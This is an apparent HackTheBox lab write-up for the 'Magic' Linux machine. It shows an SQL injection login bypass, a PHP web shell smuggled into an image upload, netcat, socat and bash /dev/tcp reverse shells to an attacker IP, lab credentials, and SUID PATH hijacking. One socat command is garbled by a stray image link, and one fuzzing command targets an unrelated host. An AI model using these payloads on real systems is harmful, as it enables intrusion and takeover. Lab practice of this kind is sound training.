---
title: "Magic"
date: 2024-07-24
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "magic", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

OS: Linux
Difficulty: Medium

## Credentials
```text
theseus : iamkingtheseus
theseus : Th3s3usW4sK1ng
```

## Enumeration

### Nmap

```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

### HTTP

![screenshot](/assets/images/magic1.png)

> PleaseÂ **[Login](http://10.10.10.185/login.php)**, to upload images.

#### login.php

![screenshot](/assets/images/magic2.png)

#### Fuzzing

```sh
ffuf -u http://10.10.10.185 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

gobuster vhost -u http://10.10.10.185 -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### SQLi

`' or 1=1-- -` as the username 

![screenshot](/assets/images/magic3.png)

```sh
echo "GIF8<?php echo system($_GET["cmd"]);?>" > test.gif
```
![screenshot](/assets/images/magic4.png)

-> did not work 

## Foothold

### File Upload - Bypass filters

Download an actual image, add `<?php echo system($_GET["cmd"]);?>` .

![screenshot](/assets/images/magic5.png)

![screenshot](/assets/images/magic7.png)

http://10.10.10.185/images/uploads/puppy.php.png?cmd=id

![screenshot](/assets/images/magic8.png)

```sh
# original payload
busybox nc 10.10.14.6 443 -e /bin/sh

# url encoded payload
busybox%20nc%2010.10.14.6%20443%20-e%20%2Fbin%2Fsh
```

Execute the command

![screenshot](/assets/images/magic10.png)

Getting a shell and upgrade to interactive shell

![screenshot](/assets/images/magic11.png)

## Privilege Escalation

### Enumeration

![screenshot](/assets/images/magic12.png)

![screenshot](/assets/images/magic13.png)

![screenshot](/assets/images/magic14.png)

```sh
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

![screenshot](/assets/images/magic15.png)

### Shell as theseus

![screenshot](/assets/images/magic17.png)

![screenshot](/assets/images/magic18.png)

```sh
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

> `/-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo`

![screenshot](/assets/images/magic21.png)

![screenshot](/assets/images/magic22.png)

This program is using `cat /proc/cpuinfo` instead of `/bin/cat /proc/cpuinfo`. 
The `/bin` directory containing the `cat` binary is included in the user's PATH environment variable. 

```sh
echo $PATH
```

![screenshot](/assets/images/magic23.png)

Normally, it is `/usr/bin/local`. This behavior can be exploited by modifying the `PATH` variable to contain a directory that is writable by our current user. 

Users are allowed to modify the variable and prepend a directory. Let's add `/tmp` directory to the `PATH`. 

```sh
export PATH=/tmp:$PATH
echo $PATH
```

![screenshot](/assets/images/magic24.png)

Added. 

Downlaod pre-compiled Socat to target.

Create a simple script in bash that sends a reverse shell to attackaer machine using Socat.

```sh
echo "./socat tcp-connect:10.10.14.6:555![screenshot](/assets/images/magic26.png)5
exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
chmod +x cat
```

```sh
/bin/sysinfo
```

To execute the cat script. 
-> Did not work 

### Alternative method
```sh
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/5555 0>&1' > fdisk

chmod +x fdisk
theseus@ubuntu:/dev/shm$ export PATH="/dev/shm:$PATH"
theseus@ubuntu:/dev/shm$ echo $PATH    
```

![screenshot](/assets/images/magic25.png)

![screenshot](/assets/images/magic26.png)
